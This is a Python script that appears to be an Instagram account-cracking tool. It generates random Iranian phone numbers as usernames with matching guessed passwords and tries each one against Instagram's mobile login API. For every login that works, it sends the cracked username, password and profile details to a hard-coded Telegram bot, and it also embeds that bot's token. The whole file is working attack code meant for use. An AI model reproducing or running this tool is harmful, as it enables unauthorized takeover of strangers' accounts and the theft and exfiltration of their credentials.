import os
os.system('clear')
try:
    from time import sleep
    import webbrowser, random, requests
    import json
    from secrets import token_hex
    import secrets, sys
except ImportError:
    os.system('pip install time')
    os.system('pip install webbrowser ')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install json')
    os.system('pip install secrets')
    os.system('pip install sys')
    os.system('clear')
    from time import sleep
    import time, webbrowser, random, requests
    from uuid import uuid4
    import json
    from secrets import token_hex
    import secrets, sys
else:
    from time import sleep
    import webbrowser, random, requests
    import json
    from secrets import token_hex
    import secrets, sys
    os.system('clear')
    aa = 0
    zz = 0
    E = '\x1b[1;31m'
    G = '\x1b[1;32m'
    S = '\x1b[1;33m'
    Z = '\x1b[1;31m'
    X = '\x1b[1;33m'
    Z1 = '\x1b[2;31m'
    F = '\x1b[2;32m'
    A = '\x1b[2;39m'
    C = '\x1b[2;35m'
    B = '\x1b[2;36m'
    Y = '\x1b[1;34m'
    import time
    timee = time.asctime()
    t = time.localtime()
    current_time = time.strftime('%H:%M:%S', t)

    def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
            sleep(0.026)

    a(f"                         {G}by{Z}: PYBORMAG ReKo ? @MPMMPP ")
    sleep(1)
    print('\n\n')
    a(Y + ' \n')
    tok = '1675297705:AAGQx9rFVvXRWg1xao3TGQa7F7Y_QNNGEcg
    ID = '-1001593506093'
    sleep(0.1)
    os.system('clear')
    start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=♰ 𝙨ًَِ𝙩ًَِ𝙖ًَِ𝙧ًَِ𝙩ًَِ 𝙘ًَِ𝙝ًَِ𝙚ًَِ𝙘ًَِ𝙠ًَِ ♰ ").json()
    id_msg = start_msg['result']['message_id']

    def code_joo(userQ, password):
        cookie = secrets.token_hex(8) * 2
        head = {'HOST':'www.instagram.com', 
         'KeepAlive':'True', 
         'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 
         'Cookie':cookie, 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'936619743392459', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'missing', 
         'Accept-Language':'en-US,en;q=0.9'}
        url_id = f"https://www.instagram.com/{userQ}/?__a=1"
        req_id = requests.get(url_id, headers=head).json()
        name = str(req_id['graphql']['user']['full_name'])
        id = str(req_id['graphql']['user']['id'])
        followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
        following = str(req_id['graphql']['user']['edge_follow']['count'])
        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
        ree = re.json()
        dat = ree['data']
        t = time.localtime()
        current_time = time.strftime('%H:%M:%S', t)
        joo3 = f"\n♰ 𝙣ًَِ𝙚ًَِ𝙬ًَِ 𝙖ًَِ𝙘ًَِ𝙘ًَِ𝙤ًَِ𝙪ًَِ𝙣ًَِ𝙩ًَِ 𝙞ًَِ𝙣ًَِ𝙨ًَِ𝙩ًَِ𝙖ًَِ  ♰ \n = = = = = = = = = = = = = = =\n- 𝙣َِ𝙖َِ𝙢َِ𝙚َِ ♰ {name}\n- 𝙪َِ𝙨َِ𝙚َِ𝙧َِ 𝙣َِ𝙖َِ𝙢َِ𝙚َِ ♰ ⿻⿻⿻⿻⿻⿻⿻\n- 𝙥ًَِ𝙖ًَِ𝙨ًَِ𝙨ًَِ𝙬ًَِ𝙤ًَِ𝙧ًَِ𝙙ًَِ ♰ ⿻⿻⿻⿻⿻⿻⿻\n- 𝙛ًَِ𝙤ًَِ𝙡ًَِ𝙡ًَِ𝙤ًَِ𝙬ًَِ𝙨ًَِ ♰ {followes}\n- 𝙙ًَِ𝙖ًَِ𝙩ًَِ ♰ {dat}\n- 𝙩ًَِ𝙞ًَِ𝙢ًَِ𝙚ًَِ ♰ {current_time}\n- 𝙩ًَِ𝙝ًَِ𝙚ًَِ𝙨َ 𝙣ًَِ𝙪ًَِ𝙢ًَِ𝙗ًَِ𝙚ًَِ𝙧ًَِ 𝙝ًَِ𝙞ًَِ𝙩ًَِ ♰ {zz}\n- 𝙩ًَِ𝙝ًَِ𝙚ًَِ𝙨ًَِ 𝙣ًَِ𝙪ًَِ𝙢ًَِ𝙗ًَِ𝙚ًَِ𝙧ًَِ 𝙗ًَِ𝙖ًَِ𝙙ًَِ ♰ {aa}\n = = = = = = = = = = = = = = =\n- 𝙛ًَِ𝙧ًَِ𝙤ًَِ𝙢ًَِ ♰ @nnnuu\n"
        tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n {joo3} \n"
        i = requests.post(tlg)
        print(G + joo3)


        poo3 = f"\n♰ 𝗋𝖾𝗄𝗈 𝗂𝗌 𝗁𝖾𝗋 ♰\n- 𝗎𝗌𝖾𝗋 ♰ {userQ}\n- 𝗉𝖺𝗌𝗌 ♰ {password}\n"
        egf = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n {poo3} \n"
        i = requests.post(egf)
        print(G + poo3)
        
        
    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
    headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
    
    
    while True:
        chars = '0987654321'
        u = '912','911','914','913','915','910','916','917','918','919','990','991','901','902','903','904','905','930','931','932','933','934','935','935','936','937','938','939','920','921','922'
        u1 = str("". join(random.choice(chars)for i in range(7)))
        u2 = str("". join(random.choice(u)for i in range(1)))
        username = '+98'+u2+u1
        password = '0'+u2+u1
        from uuid import uuid4
        uid = str(uuid4())
        data = {'uuid':uid, 
         'password':password, 
         'username':username, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req = requests.post(url, headers=headers, data=data)
        if 'logged_in_user' in req.json():
            zz += 1
            userQ = req.json()['logged_in_user']['username']
            code_joo(userQ, password)
        elif '"message":"challenge_required","challenge"' in req.json():
            print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
        else:
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=♰ 𝙨ًَِ𝙩ًَِ𝙖ًَِ𝙧ًَِ𝙩ًَِ 𝙘ًَِ𝙝ًَِ𝙚ًَِ𝙘ًَِ𝙠ًَِ 𝙞ًَِ𝙣ًَِ𝙨ًَِ𝙩ًَِ𝙖ًَِ𝙜ًَِ𝙧ًَِ𝙖ًَِ𝙢ًَِ ♰ \n= = = = = = = = = = = = = = =\n- 𝙝ًَِ𝙞ًَِ𝙩ًَِ ‎♰ {zz}\n- 𝙗ًَِ𝙖ًَِ𝙙ًَِ ♰ {aa}\n- 𝙩ًَِ𝙞ًَِ𝙢ًَِ𝙚ًَِ ♰  {current_time}\n= = = = = = = = = = = = = = =\n- 𝙛ًَِ𝙧ًَِ𝙤ًَِ𝙢ًَِ ♰ @nnnuu ")
            print('︎︎ ♰ ︎')
            aa += 1
